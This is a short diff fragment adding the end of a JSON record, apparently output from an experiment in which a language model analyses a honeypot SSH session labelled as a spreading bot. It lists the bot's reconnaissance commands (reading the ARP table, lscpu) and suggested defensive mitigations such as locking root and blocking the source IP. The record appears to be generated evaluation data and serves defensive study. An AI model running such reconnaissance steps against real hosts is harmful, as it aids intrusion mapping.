+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "ufw deny from 198.51.100.65 to any port 22",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "gen_bot_05_ssh_spread",
+      "src_ip": "198.51.100.65",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.35,
+      "comandos": [
+        "cat /proc/net/arp",
+        "lscpu"
+      ]
+    }
+  }
+]
